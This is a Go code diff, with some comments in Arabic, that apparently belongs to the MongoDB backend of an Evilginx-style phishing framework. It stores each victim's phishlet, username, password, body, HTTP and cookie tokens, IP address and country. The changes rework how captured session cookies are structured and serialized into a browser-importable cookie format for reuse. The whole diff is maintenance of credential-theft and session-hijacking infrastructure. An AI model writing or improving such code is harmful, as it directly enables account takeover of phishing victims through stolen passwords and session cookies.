@@ -25,24 +25,24 @@ type MongoDatabase struct {
 
 // Session مع تعديلات لدعم MongoDB
 type MongoSession struct {
-	ID           primitive.ObjectID            `bson:"_id,omitempty" json:"_id,omitempty"`
-	Id           int                           `bson:"id" json:"id"`
-	Phishlet     string                        `bson:"phishlet" json:"phishlet"`
-	LandingURL   string                        `bson:"landing_url" json:"landing_url"`
-	Username     string                        `bson:"username" json:"username"`
-	Password     string                        `bson:"password" json:"password"`
-	Custom       map[string]string             `bson:"custom" json:"custom"`
-	BodyTokens   map[string]string             `bson:"body_tokens" json:"body_tokens"`
-	HttpTokens   map[string]string             `bson:"http_tokens" json:"http_tokens"`
-	CookieTokens map[string]map[string]interface{} `bson:"cookie_tokens" json:"tokens"`
-	SessionId    string                        `bson:"session_id" json:"session_id"`
-	UserAgent    string                        `bson:"useragent" json:"useragent"`
-	RemoteAddr   string                        `bson:"remote_addr" json:"remote_addr"`
-	CreateTime   int64                         `bson:"create_time" json:"create_time"`
-	UpdateTime   int64                         `bson:"update_time" json:"update_time"`
-	UserId       string                        `bson:"user_id" json:"user_id"`
-	CountryCode  string                        `bson:"country_code" json:"country_code"`
-	Country      string                        `bson:"country" json:"country"`
+	ID           primitive.ObjectID                 `bson:"_id,omitempty" json:"_id,omitempty"`
+	Id           int                                `bson:"id" json:"id"`
+	Phishlet     string                             `bson:"phishlet" json:"phishlet"`
+	LandingURL   string                             `bson:"landing_url" json:"landing_url"`
+	Username     string                             `bson:"username" json:"username"`
+	Password     string                             `bson:"password" json:"password"`
+	Custom       map[string]string                  `bson:"custom" json:"custom"`
+	BodyTokens   map[string]string                  `bson:"body_tokens" json:"body_tokens"`
+	HttpTokens   map[string]string                  `bson:"http_tokens" json:"http_tokens"`
+	CookieTokens map[string][]map[string]interface{} `bson:"cookie_tokens" json:"tokens"`
+	SessionId    string                             `bson:"session_id" json:"session_id"`
+	UserAgent    string                             `bson:"useragent" json:"useragent"`
+	RemoteAddr   string                             `bson:"remote_addr" json:"remote_addr"`
+	CreateTime   int64                              `bson:"create_time" json:"create_time"`
+	UpdateTime   int64                              `bson:"update_time" json:"update_time"`
+	UserId       string                             `bson:"user_id" json:"user_id"`
+	CountryCode  string                             `bson:"country_code" json:"country_code"`
+	Country      string                             `bson:"country" json:"country"`
 }
 
 // NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
@@ -128,19 +128,19 @@ func convertToMongoSession(s *Session) *MongoSession {
 	cookieTokens := make(map[string][]map[string]interface{})
 	for domain, tokens := range s.CookieTokens {
 		cookieTokens[domain] = []map[string]interface{}{}
-		for name, token := range tokens {
+		for _, token := range tokens {
 			hostOnly := !strings.HasPrefix(domain, ".")
-			session := token.Expires.IsZero() || token.Expires.Unix() == 0
 			cookieObj := map[string]interface{}{
-				"name":            token.Name,
-				"value":           token.Value,
-				"domain":          domain,
-				"path":            token.Path,
-				"expirationDate":  token.Expires.Unix(),
-				"httpOnly":        token.HttpOnly,
-				"hostOnly":        hostOnly,
-				"secure":          false, // إذا كان لديك حقل Secure أضفه هنا
-				"session":         session,
+				"name":   token.Name,
+				"value":  token.Value,
+				"domain": domain,
+				"path":   token.Path,
+				// 'expirationDate' and 'secure' are not available, set to default
+				"expirationDate": 0,
+				"httpOnly":       token.HttpOnly,
+				"hostOnly":       hostOnly,
+				"secure":         false,
+				"session":        false,
 			}
 			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
 		}
@@ -313,7 +313,7 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 		Custom:       make(map[string]string),
 		BodyTokens:   make(map[string]string),
 		HttpTokens:   make(map[string]string),
-		CookieTokens: make(map[string]map[string]interface{}),
+		CookieTokens: make(map[string][]map[string]interface{}),
 		SessionId:    sid,
 		UserAgent:    useragent,
 		RemoteAddr:   remoteAddr,
@@ -550,19 +550,19 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 	cookieTokens := make(map[string][]map[string]interface{})
 	for domain, domainTokens := range tokens {
 		cookieTokens[domain] = []map[string]interface{}{}
-		for name, token := range domainTokens {
+		for _, token := range domainTokens {
 			hostOnly := !strings.HasPrefix(domain, ".")
-			session := token.Expires.IsZero() || token.Expires.Unix() == 0
 			cookieObj := map[string]interface{}{
-				"name":            token.Name,
-				"value":           token.Value,
-				"domain":          domain,
-				"path":            token.Path,
-				"expirationDate":  token.Expires.Unix(),
-				"httpOnly":        token.HttpOnly,
-				"hostOnly":        hostOnly,
-				"secure":          false, // إذا كان لديك حقل Secure أضفه هنا
-				"session":         session,
+				"name":   token.Name,
+				"value":  token.Value,
+				"domain": domain,
+				"path":   token.Path,
+				// 'expirationDate' and 'secure' are not available, set to default
+				"expirationDate": 0,
+				"httpOnly":       token.HttpOnly,
+				"hostOnly":       hostOnly,
+				"secure":         false,
+				"session":        false,
 			}
 			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
 		}
